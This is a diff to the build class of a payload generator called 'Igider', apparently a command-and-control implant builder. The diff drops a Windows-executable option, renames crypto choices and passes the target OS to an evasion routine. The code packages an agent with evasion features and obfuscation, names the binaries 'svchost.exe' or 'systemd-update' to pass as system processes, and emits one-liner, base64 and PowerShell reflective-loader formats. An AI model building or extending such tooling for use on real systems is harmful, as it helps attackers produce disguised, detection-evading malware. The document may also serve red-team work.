@@ -19,6 +19,7 @@ import re
 from collections import OrderedDict
 
 class Igider(PayloadType):
+
     name = "igider"
     file_extension = "py"
     author = "@med"
@@ -36,17 +37,16 @@ class Igider(PayloadType):
             name="output",
             parameter_type=BuildParameterType.ChooseOne,
             description="How the final payload should be structured for execution",
-            choices=["py", "base64", "py_compressed", "one_liner", "exe_windows", "elf_linux", "powershell_reflective"],
+            choices=["py", "base64", "py_compressed", "one_liner", "elf_linux", "powershell_reflective"],
             default_value="py"
         ),
         
-        ####to review!!!###########
         BuildParameter(
             name="cryptography_method",
             parameter_type=BuildParameterType.ChooseOne,
             description="Select crypto implementation method",
-            choices=["manual", "cryptography_lib", "pycryptodome"],
-            default_value="manual"
+            choices=["CryptoAES", "CustomAES"],
+            default_value="CustomAES"
         ),
         BuildParameter(
             name="obfuscation_level",
@@ -299,36 +299,16 @@ class Igider(PayloadType):
 
             exe_name = "svchost.exe" if target_os == "windows" else "systemd-update"
             exe_path = os.path.join(temp_dir, "dist", exe_name)
-
-            if target_os == "windows":
-                # Check for custom Windows bootloader
-                bootloader_path = "/usr/local/bin/pyinstaller_win64_loader.exe"
-                if not os.path.exists(bootloader_path):
-                    raise Exception("Windows bootloader not found. Did you build it in Docker?")
-
-                # Write the .spec file
-                spec_code = self._create_pyinstaller_spec(code, target_os)
-                spec_file = os.path.join(temp_dir, "build.spec")
-                with open(spec_file, "w") as f:
-                    f.write(spec_code)
-
-                # Use the .spec file to build
-                cmd = [
-                    sys.executable, "-m", "PyInstaller",
-                    spec_file
-                ]
-            else:
-                # Direct build for Linux
-                cmd = [
-                    sys.executable, "-m", "PyInstaller",
-                    "--onefile",
-                    "--name", exe_name,
-                    "--distpath", os.path.join(temp_dir, "dist"),
-                    "--workpath", os.path.join(temp_dir, "build"),
-                    "--specpath", temp_dir,
-                    "--console",
-                    main_py
-                ]
+            cmd = [
+                sys.executable, "-m", "PyInstaller",
+                "--onefile",
+                "--name", exe_name,
+                "--distpath", os.path.join(temp_dir, "dist"),
+                "--workpath", os.path.join(temp_dir, "build"),
+                "--specpath", temp_dir,
+                "--console",
+                main_py
+            ]
 
             try:
                 self.logger.info(f"Running PyInstaller: {' '.join(cmd)}")
@@ -346,7 +326,6 @@ class Igider(PayloadType):
                 if not os.path.exists(exe_path):
                     raise Exception(f"Executable not found at {exe_path}")
 
-                # Optional: log file type
                 try:
                     ftype = subprocess.check_output(["file", exe_path]).decode().strip()
                     self.logger.info(f"Generated executable type: {ftype}")
@@ -382,14 +361,11 @@ class Igider(PayloadType):
                 
             base_code = self._load_module_content(base_agent_path)
             
-            #############################################################################################
             # Load appropriate crypto module
             crypto_method = self.get_parameter("cryptography_method")
-            if crypto_method == "cryptography_lib":
+            if crypto_method == "CryptoAES":
                 crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "crypto_lib")
-            elif crypto_method == "pycryptodome":
-                crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "pycrypto_lib")
-            else:  # default to manual
+            else: 
                 crypto_path = self.get_file_path(os.path.join(self.agent_code_path, "base_agent"), "manual_crypto")
                 
             if not crypto_path:
@@ -447,7 +423,7 @@ class Igider(PayloadType):
             # Step 4: Apply obfuscation
             await self.update_build_step("Applying Obfuscation", "Implementing code obfuscation...")
                 # Add evasion features first
-            base_code = add_evasion_features(base_code)
+            base_code = add_evasion_features(base_code,selected_os)
                 # Apply obfuscation based on selected level
             obfuscation_level = self.get_parameter("obfuscation_level")
             if obfuscation_level == "advanced":
@@ -463,28 +439,21 @@ class Igider(PayloadType):
             await self.update_build_step("Finalizing Payload", "Preparing output in requested format...")
             
             output_format = self.get_parameter("output")
+
             if output_format == "base64":
                 resp.payload = base64.b64encode(base_code.encode())
                 resp.build_message = "Successfully built payload in base64 format"
+
             elif output_format == "py_compressed":
                 compressed_code = compress_code(base_code)
                 resp.payload = compressed_code.encode()
                 resp.build_message = "Successfully built compressed Python payload"
+
             elif output_format == "one_liner":
                 one_liner = create_one_liner(base_code)
                 resp.payload = one_liner.encode()
                 resp.build_message = "Successfully built one-liner payload"
-            if output_format == "exe_windows":
-                try:
-                    await self.update_build_step("Finalizing Payload", "Building Windows executable...")
-                    executable_data = self._build_executable(base_code,"windows")
-                    resp.payload = executable_data
-                    resp.updated_filename = (self.filename).split(".")[0] +".exe"
-                    resp.build_message = "Successfully built Windows executable"
-                except Exception as e:
-                    resp.set_status(BuildStatus.Error)
-                    resp.build_stderr = f"Failed to build Windows executable: {str(e)}"
-                    return resp
+
             elif output_format == "elf_linux":
                 try:
                     await self.update_build_step("Finalizing Payload", "Building Linux executable...")
@@ -496,6 +465,7 @@ class Igider(PayloadType):
                     resp.set_status(BuildStatus.Error)
                     resp.build_stderr = f"Failed to build Linux executable: {str(e)} * {self.filename} * {output_format}"
                     return resp
+                
             elif output_format == "powershell_reflective":
                 try:
                     await self.update_build_step("Finalizing Payload", "Creating PowerShell reflective loader...")
@@ -507,6 +477,7 @@ class Igider(PayloadType):
                     resp.set_status(BuildStatus.Error)
                     resp.build_stderr = f"Failed to build PowerShell loader: {str(e)}"
                     return resp
+                
             else:  # default to py
                 resp.payload = base_code.encode()
                 resp.build_message = "Successfully built Python script payload"
